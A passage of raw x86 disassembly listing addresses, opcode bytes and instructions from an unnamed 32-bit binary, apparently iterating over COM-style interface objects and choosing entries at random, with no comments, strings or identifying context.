  408aa6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408aa7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408aa8:	8b 08                	mov    (%eax),%ecx
  408aaa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408aab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408aac:	83 ec 10             	sub    $0x10,%esp
  408aaf:	8b fc                	mov    %esp,%edi
  408ab1:	8d 75 c4             	lea    -0x3c(%ebp),%esi
  408ab4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408ab5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408ab6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408ab7:	50                   	push   %eax
  408ab8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408ab9:	ff 51 2c             	call   *0x2c(%ecx)
  408abc:	85 c0                	test   %eax,%eax
  408abe:	0f 8c 49 01 00 00    	jl     0x408c0d
  408ac4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408ac7:	8b 08                	mov    (%eax),%ecx
  408ac9:	8d 55 ec             	lea    -0x14(%ebp),%edx
  408acc:	52                   	push   %edx
  408acd:	68 08 e2 40 00       	push   $0x40e208
  408ad2:	50                   	push   %eax
  408ad3:	ff 11                	call   *(%ecx)
  408ad5:	8b f0                	mov    %eax,%esi
  408ad7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408ada:	8b 08                	mov    (%eax),%ecx
  408adc:	50                   	push   %eax
  408add:	ff 51 08             	call   *0x8(%ecx)
  408ae0:	33 ff                	xor    %edi,%edi
  408ae2:	3b f7                	cmp    %edi,%esi
  408ae4:	0f 8c 23 01 00 00    	jl     0x408c0d
  408aea:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408aed:	8b 08                	mov    (%eax),%ecx
  408aef:	8d 55 f0             	lea    -0x10(%ebp),%edx
  408af2:	52                   	push   %edx
  408af3:	50                   	push   %eax
  408af4:	ff 51 38             	call   *0x38(%ecx)
  408af7:	85 c0                	test   %eax,%eax
  408af9:	0f 8c a3 00 00 00    	jl     0x408ba2
  408aff:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  408b02:	0f 84 91 00 00 00    	je     0x408b99
  408b08:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408b0b:	b8 d0 ee 40 00       	mov    $0x40eed0,%eax
  408b10:	e8 52 c9 ff ff       	call   0x405467
  408b15:	85 c0                	test   %eax,%eax
  408b17:	74 11                	je     0x408b2a
  408b19:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408b1c:	b8 d4 ee 40 00       	mov    $0x40eed4,%eax
  408b21:	e8 41 c9 ff ff       	call   0x405467
  408b26:	85 c0                	test   %eax,%eax
  408b28:	75 6f                	jne    0x408b99
  408b2a:	8b 75 d8             	mov    -0x28(%ebp),%esi
  408b2d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408b30:	8b 08                	mov    (%eax),%ecx
  408b32:	56                   	push   %esi
  408b33:	68 f8 e1 40 00       	push   $0x40e1f8
  408b38:	50                   	push   %eax
  408b39:	ff 11                	call   *(%ecx)
  408b3b:	85 c0                	test   %eax,%eax
  408b3d:	7c 6c                	jl     0x408bab
  408b3f:	8b 06                	mov    (%esi),%eax
  408b41:	8d 55 e0             	lea    -0x20(%ebp),%edx
  408b44:	52                   	push   %edx
  408b45:	89 7d e0             	mov    %edi,-0x20(%ebp)
  408b48:	8b 08                	mov    (%eax),%ecx
  408b4a:	50                   	push   %eax
  408b4b:	ff 51 78             	call   *0x78(%ecx)
  408b4e:	85 c0                	test   %eax,%eax
  408b50:	7c 59                	jl     0x408bab
  408b52:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408b55:	3b c7                	cmp    %edi,%eax
  408b57:	74 52                	je     0x408bab
  408b59:	68 d8 ee 40 00       	push   $0x40eed8
  408b5e:	e8 30 c9 ff ff       	call   0x405493
  408b63:	85 c0                	test   %eax,%eax
  408b65:	59                   	pop    %ecx
  408b66:	74 03                	je     0x408b6b
  408b68:	33 ff                	xor    %edi,%edi
  408b6a:	47                   	inc    %edi
  408b6b:	ff 75 e0             	push   -0x20(%ebp)
  408b6e:	ff 15 00 e1 40 00    	call   *0x40e100
  408b74:	85 ff                	test   %edi,%edi
  408b76:	74 19                	je     0x408b91
  408b78:	ff 36                	push   (%esi)
  408b7a:	ff 75 08             	push   0x8(%ebp)
  408b7d:	ff 55 14             	call   *0x14(%ebp)
  408b80:	85 c0                	test   %eax,%eax
  408b82:	59                   	pop    %ecx
  408b83:	59                   	pop    %ecx
  408b84:	74 0b                	je     0x408b91
  408b86:	ff 45 f8             	incl   -0x8(%ebp)
  408b89:	83 c6 04             	add    $0x4,%esi
  408b8c:	89 75 d8             	mov    %esi,-0x28(%ebp)
  408b8f:	eb 08                	jmp    0x408b99
  408b91:	8b 06                	mov    (%esi),%eax
  408b93:	8b 08                	mov    (%eax),%ecx
  408b95:	50                   	push   %eax
  408b96:	ff 51 08             	call   *0x8(%ecx)
  408b99:	ff 75 f0             	push   -0x10(%ebp)
  408b9c:	ff 15 00 e1 40 00    	call   *0x40e100
  408ba2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408ba5:	8b 08                	mov    (%eax),%ecx
  408ba7:	50                   	push   %eax
  408ba8:	ff 51 08             	call   *0x8(%ecx)
  408bab:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  408bae:	50                   	push   %eax
  408baf:	ff 15 0c e1 40 00    	call   *0x40e10c
  408bb5:	ff 45 e8             	incl   -0x18(%ebp)
  408bb8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408bbb:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  408bbe:	0f 8c bb fe ff ff    	jl     0x408a7f
  408bc4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408bc7:	33 f6                	xor    %esi,%esi
  408bc9:	3b c6                	cmp    %esi,%eax
  408bcb:	0f 84 4d fe ff ff    	je     0x408a1e
  408bd1:	3b 45 10             	cmp    0x10(%ebp),%eax
  408bd4:	89 33                	mov    %esi,(%ebx)
  408bd6:	7f 44                	jg     0x408c1c
  408bd8:	3b c6                	cmp    %esi,%eax
  408bda:	0f 8e a9 00 00 00    	jle    0x408c89
  408be0:	8b 13                	mov    (%ebx),%edx
  408be2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408be5:	8b 84 b5 fc fe ff ff 	mov    -0x104(%ebp,%esi,4),%eax
  408bec:	8b 08                	mov    (%eax),%ecx
  408bee:	8d 14 97             	lea    (%edi,%edx,4),%edx
  408bf1:	52                   	push   %edx
  408bf2:	50                   	push   %eax
  408bf3:	ff 51 20             	call   *0x20(%ecx)
  408bf6:	85 c0                	test   %eax,%eax
  408bf8:	7c 0b                	jl     0x408c05
  408bfa:	8b 03                	mov    (%ebx),%eax
  408bfc:	83 3c 87 00          	cmpl   $0x0,(%edi,%eax,4)
  408c00:	74 03                	je     0x408c05
  408c02:	40                   	inc    %eax
  408c03:	89 03                	mov    %eax,(%ebx)
  408c05:	46                   	inc    %esi
  408c06:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  408c09:	7c d5                	jl     0x408be0
  408c0b:	eb 7c                	jmp    0x408c89
  408c0d:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  408c10:	50                   	push   %eax
  408c11:	ff 15 0c e1 40 00    	call   *0x40e10c
  408c17:	e9 02 fe ff ff       	jmp    0x408a1e
  408c1c:	6a 32                	push   $0x32
  408c1e:	59                   	pop    %ecx
  408c1f:	33 c0                	xor    %eax,%eax
  408c21:	8d bd 34 fe ff ff    	lea    -0x1cc(%ebp),%edi
  408c27:	89 75 08             	mov    %esi,0x8(%ebp)
  408c2a:	f3 ab                	rep stos %eax,%es:(%edi)
  408c2c:	ff 15 50 e0 40 00    	call   *0x40e050
  408c32:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  408c37:	e8 11 cc ff ff       	call   0x40584d
  408c3c:	99                   	cltd
  408c3d:	f7 7d f8             	idivl  -0x8(%ebp)
  408c40:	8b c2                	mov    %edx,%eax
  408c42:	c1 e0 02             	shl    $0x2,%eax
  408c45:	8d b4 05 34 fe ff ff 	lea    -0x1cc(%ebp,%eax,1),%esi
  408c4c:	83 3e 00             	cmpl   $0x0,(%esi)
  408c4f:	75 2b                	jne    0x408c7c
  408c51:	8b 13                	mov    (%ebx),%edx
  408c53:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408c56:	8b 84 05 fc fe ff ff 	mov    -0x104(%ebp,%eax,1),%eax
  408c5d:	8b 08                	mov    (%eax),%ecx
  408c5f:	8d 14 97             	lea    (%edi,%edx,4),%edx
  408c62:	52                   	push   %edx
  408c63:	50                   	push   %eax
  408c64:	ff 51 20             	call   *0x20(%ecx)
  408c67:	85 c0                	test   %eax,%eax
  408c69:	7c 0e                	jl     0x408c79
  408c6b:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  408c6f:	ff 03                	incl   (%ebx)
  408c71:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  408c77:	eb 09                	jmp    0x408c82
  408c79:	ff 45 08             	incl   0x8(%ebp)
  408c7c:	83 7d 08 05          	cmpl   $0x5,0x8(%ebp)
  408c80:	7d 07                	jge    0x408c89
  408c82:	8b 45 10             	mov    0x10(%ebp),%eax
  408c85:	39 03                	cmp    %eax,(%ebx)
  408c87:	7c ae                	jl     0x408c37
  408c89:	33 f6                	xor    %esi,%esi
  408c8b:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  408c8e:	7e 13                	jle    0x408ca3
  408c90:	8b 84 b5 fc fe ff ff 	mov    -0x104(%ebp,%esi,4),%eax
  408c97:	8b 08                	mov    (%eax),%ecx
  408c99:	50                   	push   %eax
  408c9a:	ff 51 08             	call   *0x8(%ecx)
  408c9d:	46                   	inc    %esi
  408c9e:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  408ca1:	7c ed                	jl     0x408c90
  408ca3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408ca6:	8b 08                	mov    (%eax),%ecx
  408ca8:	50                   	push   %eax
  408ca9:	ff 51 08             	call   *0x8(%ecx)
  408cac:	33 c0                	xor    %eax,%eax
  408cae:	39 03                	cmp    %eax,(%ebx)
  408cb0:	0f 95 c0             	setne  %al
  408cb3:	5f                   	pop    %edi
  408cb4:	5e                   	pop    %esi
  408cb5:	c9                   	leave
  408cb6:	c3                   	ret
  408cb7:	55                   	push   %ebp
  408cb8:	8b ec                	mov    %esp,%ebp
  408cba:	81 ec cc 01 00 00    	sub    $0x1cc,%esp
  408cc0:	8b 08                	mov    (%eax),%ecx
  408cc2:	53                   	push   %ebx
  408cc3:	56                   	push   %esi
  408cc4:	57                   	push   %edi
  408cc5:	8d 55 f8             	lea    -0x8(%ebp),%edx
  408cc8:	52                   	push   %edx
  408cc9:	33 ff                	xor    %edi,%edi
  408ccb:	50                   	push   %eax
  408ccc:	89 7d f0             	mov    %edi,-0x10(%ebp)
  408ccf:	ff 51 48             	call   *0x48(%ecx)
  408cd2:	85 c0                	test   %eax,%eax
  408cd4:	7d 07                	jge    0x408cdd
  408cd6:	33 c0                	xor    %eax,%eax
  408cd8:	e9 35 02 00 00       	jmp    0x408f12
  408cdd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408ce0:	8b 08                	mov    (%eax),%ecx
  408ce2:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408ce5:	52                   	push   %edx
  408ce6:	68 e8 e1 40 00       	push   $0x40e1e8
  408ceb:	50                   	push   %eax
  408cec:	ff 11                	call   *(%ecx)
  408cee:	8b f0                	mov    %eax,%esi
  408cf0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408cf3:	8b 08                	mov    (%eax),%ecx
  408cf5:	50                   	push   %eax
  408cf6:	ff 51 08             	call   *0x8(%ecx)
  408cf9:	3b f7                	cmp    %edi,%esi
  408cfb:	7c d9                	jl     0x408cd6
  408cfd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408d00:	8b 08                	mov    (%eax),%ecx
  408d02:	8d 55 e0             	lea    -0x20(%ebp),%edx
  408d05:	52                   	push   %edx
  408d06:	50                   	push   %eax
  408d07:	ff 51 20             	call   *0x20(%ecx)
  408d0a:	8b f0                	mov    %eax,%esi
  408d0c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408d0f:	8b 08                	mov    (%eax),%ecx
  408d11:	50                   	push   %eax
  408d12:	ff 51 08             	call   *0x8(%ecx)
  408d15:	3b f7                	cmp    %edi,%esi
  408d17:	7c bd                	jl     0x408cd6
  408d19:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408d1c:	8b 08                	mov    (%eax),%ecx
  408d1e:	8d 55 d8             	lea    -0x28(%ebp),%edx
  408d21:	52                   	push   %edx
  408d22:	50                   	push   %eax
  408d23:	ff 51 24             	call   *0x24(%ecx)
  408d26:	39 7d d8             	cmp    %edi,-0x28(%ebp)
  408d29:	89 7d e8             	mov    %edi,-0x18(%ebp)
  408d2c:	0f 8e 5d 01 00 00    	jle    0x408e8f
  408d32:	83 7d f0 64          	cmpl   $0x64,-0x10(%ebp)
  408d36:	0f 8d 53 01 00 00    	jge    0x408e8f
  408d3c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408d3f:	89 45 d0             	mov    %eax,-0x30(%ebp)
  408d42:	66 c7 45 c8 16 00    	movw   $0x16,-0x38(%ebp)
  408d48:	8d 55 f8             	lea    -0x8(%ebp),%edx
  408d4b:	52                   	push   %edx
  408d4c:	83 ec 10             	sub    $0x10,%esp
  408d4f:	8b fc                	mov    %esp,%edi
  408d51:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408d54:	8d 75 c8             	lea    -0x38(%ebp),%esi
  408d57:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d58:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d59:	8b 08                	mov    (%eax),%ecx
  408d5b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d5c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d5d:	83 ec 10             	sub    $0x10,%esp
  408d60:	8b fc                	mov    %esp,%edi
  408d62:	8d 75 c8             	lea    -0x38(%ebp),%esi
  408d65:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d66:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d67:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d68:	50                   	push   %eax
  408d69:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408d6a:	ff 51 2c             	call   *0x2c(%ecx)
  408d6d:	85 c0                	test   %eax,%eax
  408d6f:	0f 8c a2 01 00 00    	jl     0x408f17
  408d75:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408d78:	8b 08                	mov    (%eax),%ecx
  408d7a:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408d7d:	52                   	push   %edx
  408d7e:	68 08 e2 40 00       	push   $0x40e208
  408d83:	50                   	push   %eax
  408d84:	ff 11                	call   *(%ecx)
  408d86:	8b f0                	mov    %eax,%esi
  408d88:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408d8b:	8b 08                	mov    (%eax),%ecx
  408d8d:	50                   	push   %eax
  408d8e:	ff 51 08             	call   *0x8(%ecx)
  408d91:	33 ff                	xor    %edi,%edi
  408d93:	3b f7                	cmp    %edi,%esi
  408d95:	0f 8c 7c 01 00 00    	jl     0x408f17
  408d9b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408d9e:	8b 08                	mov    (%eax),%ecx
  408da0:	8d 55 ec             	lea    -0x14(%ebp),%edx
  408da3:	52                   	push   %edx
  408da4:	50                   	push   %eax
  408da5:	ff 51 38             	call   *0x38(%ecx)
  408da8:	85 c0                	test   %eax,%eax
  408daa:	7d 0e                	jge    0x408dba
  408dac:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408daf:	8b 08                	mov    (%eax),%ecx
  408db1:	50                   	push   %eax
  408db2:	ff 51 08             	call   *0x8(%ecx)
  408db5:	e9 bc 00 00 00       	jmp    0x408e76
  408dba:	39 7d ec             	cmp    %edi,-0x14(%ebp)
  408dbd:	0f 84 aa 00 00 00    	je     0x408e6d
  408dc3:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408dc6:	b8 d0 ee 40 00       	mov    $0x40eed0,%eax
  408dcb:	e8 97 c6 ff ff       	call   0x405467
  408dd0:	85 c0                	test   %eax,%eax
  408dd2:	74 15                	je     0x408de9
  408dd4:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408dd7:	b8 d4 ee 40 00       	mov    $0x40eed4,%eax
  408ddc:	e8 86 c6 ff ff       	call   0x405467
  408de1:	85 c0                	test   %eax,%eax
  408de3:	0f 85 84 00 00 00    	jne    0x408e6d
  408de9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408dec:	8b 08                	mov    (%eax),%ecx
  408dee:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408df1:	52                   	push   %edx
  408df2:	68 f8 e1 40 00       	push   $0x40e1f8
  408df7:	50                   	push   %eax
  408df8:	ff 11                	call   *(%ecx)
  408dfa:	85 c0                	test   %eax,%eax
  408dfc:	7c 78                	jl     0x408e76
  408dfe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e01:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  408e04:	52                   	push   %edx
  408e05:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  408e08:	8b 08                	mov    (%eax),%ecx
  408e0a:	50                   	push   %eax
  408e0b:	ff 51 78             	call   *0x78(%ecx)
  408e0e:	85 c0                	test   %eax,%eax
  408e10:	7c 64                	jl     0x408e76
  408e12:	39 7d e4             	cmp    %edi,-0x1c(%ebp)
  408e15:	74 5f                	je     0x408e76
  408e17:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408e1a:	68 d8 ee 40 00       	push   $0x40eed8
  408e1f:	33 f6                	xor    %esi,%esi
  408e21:	e8 6d c6 ff ff       	call   0x405493
  408e26:	85 c0                	test   %eax,%eax
  408e28:	59                   	pop    %ecx
  408e29:	74 01                	je     0x408e2c
  408e2b:	46                   	inc    %esi
  408e2c:	ff 75 e4             	push   -0x1c(%ebp)
  408e2f:	ff 15 00 e1 40 00    	call   *0x40e100
  408e35:	3b f7                	cmp    %edi,%esi
  408e37:	74 22                	je     0x408e5b
  408e39:	ff 75 0c             	push   0xc(%ebp)
  408e3c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  408e3f:	e8 3d 07 00 00       	call   0x409581
  408e44:	85 c0                	test   %eax,%eax
  408e46:	59                   	pop    %ecx
  408e47:	74 12                	je     0x408e5b
  408e49:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408e4c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408e4f:	ff 45 f0             	incl   -0x10(%ebp)
  408e52:	89 84 8d 38 fe ff ff 	mov    %eax,-0x1c8(%ebp,%ecx,4)
  408e59:	eb 09                	jmp    0x408e64
  408e5b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408e5e:	8b 08                	mov    (%eax),%ecx
  408e60:	50                   	push   %eax
  408e61:	ff 51 08             	call   *0x8(%ecx)
  408e64:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e67:	8b 08                	mov    (%eax),%ecx
  408e69:	50                   	push   %eax
  408e6a:	ff 51 08             	call   *0x8(%ecx)
  408e6d:	ff 75 ec             	push   -0x14(%ebp)
  408e70:	ff 15 00 e1 40 00    	call   *0x40e100
  408e76:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408e79:	50                   	push   %eax
  408e7a:	ff 15 0c e1 40 00    	call   *0x40e10c
  408e80:	ff 45 e8             	incl   -0x18(%ebp)
  408e83:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408e86:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  408e89:	0f 8c a3 fe ff ff    	jl     0x408d32
  408e8f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408e92:	8b 08                	mov    (%eax),%ecx
  408e94:	50                   	push   %eax
  408e95:	ff 51 08             	call   *0x8(%ecx)
  408e98:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  408e9b:	85 db                	test   %ebx,%ebx
  408e9d:	0f 84 33 fe ff ff    	je     0x408cd6
  408ea3:	e8 a5 c9 ff ff       	call   0x40584d
  408ea8:	99                   	cltd
  408ea9:	f7 fb                	idiv   %ebx
  408eab:	8b b4 95 38 fe ff ff 	mov    -0x1c8(%ebp,%edx,4),%esi
  408eb2:	8b 06                	mov    (%esi),%eax
  408eb4:	56                   	push   %esi
  408eb5:	ff 50 04             	call   *0x4(%eax)
  408eb8:	8b 7d 08             	mov    0x8(%ebp),%edi
  408ebb:	8b 06                	mov    (%esi),%eax
  408ebd:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  408ec0:	51                   	push   %ecx
  408ec1:	68 f8 e1 40 00       	push   $0x40e1f8
  408ec6:	56                   	push   %esi
  408ec7:	89 37                	mov    %esi,(%edi)
  408ec9:	ff 10                	call   *(%eax)
  408ecb:	85 c0                	test   %eax,%eax
  408ecd:	7c 24                	jl     0x408ef3
  408ecf:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  408ed3:	74 1e                	je     0x408ef3
  408ed5:	68 e4 ee 40 00       	push   $0x40eee4
  408eda:	ff 15 08 e1 40 00    	call   *0x40e108
  408ee0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408ee3:	8b 11                	mov    (%ecx),%edx
  408ee5:	50                   	push   %eax
  408ee6:	51                   	push   %ecx
  408ee7:	ff 52 24             	call   *0x24(%edx)
  408eea:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408eed:	8b 08                	mov    (%eax),%ecx
  408eef:	50                   	push   %eax
  408ef0:	ff 51 08             	call   *0x8(%ecx)
  408ef3:	33 f6                	xor    %esi,%esi
  408ef5:	85 db                	test   %ebx,%ebx
  408ef7:	7e 12                	jle    0x408f0b
  408ef9:	8b 84 b5 38 fe ff ff 	mov    -0x1c8(%ebp,%esi,4),%eax
  408f00:	8b 08                	mov    (%eax),%ecx
  408f02:	50                   	push   %eax
  408f03:	ff 51 08             	call   *0x8(%ecx)
  408f06:	46                   	inc    %esi
  408f07:	3b f3                	cmp    %ebx,%esi
  408f09:	7c ee                	jl     0x408ef9
  408f0b:	33 c0                	xor    %eax,%eax
  408f0d:	39 07                	cmp    %eax,(%edi)
  408f0f:	0f 95 c0             	setne  %al
  408f12:	5f                   	pop    %edi
  408f13:	5e                   	pop    %esi
  408f14:	5b                   	pop    %ebx
  408f15:	c9                   	leave
  408f16:	c3                   	ret
  408f17:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408f1a:	50                   	push   %eax
  408f1b:	ff 15 0c e1 40 00    	call   *0x40e10c
  408f21:	e9 b0 fd ff ff       	jmp    0x408cd6
  408f26:	55                   	push   %ebp
  408f27:	8b ec                	mov    %esp,%ebp
  408f29:	81 ec 94 0c 00 00    	sub    $0xc94,%esp
  408f2f:	53                   	push   %ebx
  408f30:	e8 4d 16 00 00       	call   0x40a582
  408f35:	33 db                	xor    %ebx,%ebx
  408f37:	3b c3                	cmp    %ebx,%eax
  408f39:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408f3c:	75 07                	jne    0x408f45
  408f3e:	33 c0                	xor    %eax,%eax
  408f40:	e9 e7 01 00 00       	jmp    0x40912c
  408f45:	57                   	push   %edi
  408f46:	33 ff                	xor    %edi,%edi
  408f48:	39 1d 54 21 41 00    	cmp    %ebx,0x412154
  408f4e:	89 7d f4             	mov    %edi,-0xc(%ebp)
  408f51:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  408f54:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408f57:	66 89 1d 02 22 41 00 	mov    %bx,0x412202
  408f5e:	66 89 1d 00 22 41 00 	mov    %bx,0x412200
  408f65:	66 89 1d 52 19 41 00 	mov    %bx,0x411952
  408f6c:	66 89 1d 50 19 41 00 	mov    %bx,0x411950
  408f73:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408f76:	7e 1e                	jle    0x408f96
  408f78:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f7b:	ff 34 85 58 21 41 00 	push   0x412158(,%eax,4)
  408f82:	ff 15 00 e1 40 00    	call   *0x40e100
  408f88:	ff 45 fc             	incl   -0x4(%ebp)
  408f8b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f8e:	3b 05 54 21 41 00    	cmp    0x412154,%eax
  408f94:	7c e2                	jl     0x408f78
  408f96:	89 1d 54 21 41 00    	mov    %ebx,0x412154
  408f9c:	8d 84 bd 8c f6 ff ff 	lea    -0x974(%ebp,%edi,4),%eax
  408fa3:	50                   	push   %eax
  408fa4:	8d 84 bd cc fc ff ff 	lea    -0x334(%ebp,%edi,4),%eax
  408fab:	50                   	push   %eax
  408fac:	ff 75 ec             	push   -0x14(%ebp)
  408faf:	ff 55 10             	call   *0x10(%ebp)
  408fb2:	83 c4 0c             	add    $0xc,%esp
  408fb5:	3b c3                	cmp    %ebx,%eax
  408fb7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408fba:	74 0c                	je     0x408fc8
  408fbc:	47                   	inc    %edi
  408fbd:	81 ff c8 00 00 00    	cmp    $0xc8,%edi
  408fc3:	89 7d f4             	mov    %edi,-0xc(%ebp)
  408fc6:	7c d4                	jl     0x408f9c
  408fc8:	3b fb                	cmp    %ebx,%edi
  408fca:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  408fcd:	7e 6a                	jle    0x409039
  408fcf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408fd2:	3b 45 18             	cmp    0x18(%ebp),%eax
  408fd5:	7d 62                	jge    0x409039
  408fd7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408fda:	c1 e0 02             	shl    $0x2,%eax
  408fdd:	8d bc 05 8c f6 ff ff 	lea    -0x974(%ebp,%eax,1),%edi
  408fe4:	ff 37                	push   (%edi)
  408fe6:	8d 9c 05 cc fc ff ff 	lea    -0x334(%ebp,%eax,1),%ebx
  408fed:	ff 33                	push   (%ebx)
  408fef:	ff 55 14             	call   *0x14(%ebp)
  408ff2:	85 c0                	test   %eax,%eax
  408ff4:	8b 3f                	mov    (%edi),%edi
  408ff6:	59                   	pop    %ecx
  408ff7:	59                   	pop    %ecx
  408ff8:	74 27                	je     0x409021
  408ffa:	85 ff                	test   %edi,%edi
  408ffc:	8b 03                	mov    (%ebx),%eax
  408ffe:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409001:	89 84 8d ac f9 ff ff 	mov    %eax,-0x654(%ebp,%ecx,4)
  409008:	74 12                	je     0x40901c
  40900a:	a1 54 21 41 00       	mov    0x412154,%eax
  40900f:	ff 05 54 21 41 00    	incl   0x412154
  409015:	89 3c 85 58 21 41 00 	mov    %edi,0x412158(,%eax,4)
  40901c:	ff 45 f8             	incl   -0x8(%ebp)
  40901f:	eb 0b                	jmp    0x40902c
  409021:	85 ff                	test   %edi,%edi
  409023:	74 07                	je     0x40902c
  409025:	57                   	push   %edi
  409026:	ff 15 00 e1 40 00    	call   *0x40e100
  40902c:	ff 45 fc             	incl   -0x4(%ebp)
  40902f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409032:	33 db                	xor    %ebx,%ebx
  409034:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  409037:	7c 96                	jl     0x408fcf
  409039:	8b 45 0c             	mov    0xc(%ebp),%eax
  40903c:	3b c3                	cmp    %ebx,%eax
  40903e:	75 13                	jne    0x409053
  409040:	33 db                	xor    %ebx,%ebx
  409042:	43                   	inc    %ebx
  409043:	ff 75 f0             	push   -0x10(%ebp)
  409046:	ff 15 00 e1 40 00    	call   *0x40e100
  40904c:	8b c3                	mov    %ebx,%eax
  40904e:	e9 d8 00 00 00       	jmp    0x40912b
  409053:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  409056:	74 eb                	je     0x409043
  409058:	39 45 f8             	cmp    %eax,-0x8(%ebp)
  40905b:	89 1e                	mov    %ebx,(%esi)
  40905d:	7f 32                	jg     0x409091
  40905f:	33 ff                	xor    %edi,%edi
  409061:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  409064:	0f 8e 97 00 00 00    	jle    0x409101
  40906a:	ff b4 bd ac f9 ff ff 	push   -0x654(%ebp,%edi,4)
  409071:	ff 15 08 e1 40 00    	call   *0x40e108
  409077:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40907a:	8b 16                	mov    (%esi),%edx
  40907c:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  40907f:	8b 06                	mov    (%esi),%eax
  409081:	39 1c 81             	cmp    %ebx,(%ecx,%eax,4)
  409084:	74 03                	je     0x409089
  409086:	40                   	inc    %eax
  409087:	89 06                	mov    %eax,(%esi)
  409089:	47                   	inc    %edi
  40908a:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  40908d:	7c db                	jl     0x40906a
  40908f:	eb 70                	jmp    0x409101
  409091:	33 c0                	xor    %eax,%eax
  409093:	b9 c8 00 00 00       	mov    $0xc8,%ecx
  409098:	8d bd 6c f3 ff ff    	lea    -0xc94(%ebp),%edi
  40909e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4090a1:	f3 ab                	rep stos %eax,%es:(%edi)
  4090a3:	ff 15 50 e0 40 00    	call   *0x40e050
  4090a9:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  4090ae:	e8 9a c7 ff ff       	call   0x40584d
  4090b3:	99                   	cltd
  4090b4:	f7 7d f8             	idivl  -0x8(%ebp)
  4090b7:	8b c2                	mov    %edx,%eax
  4090b9:	c1 e0 02             	shl    $0x2,%eax
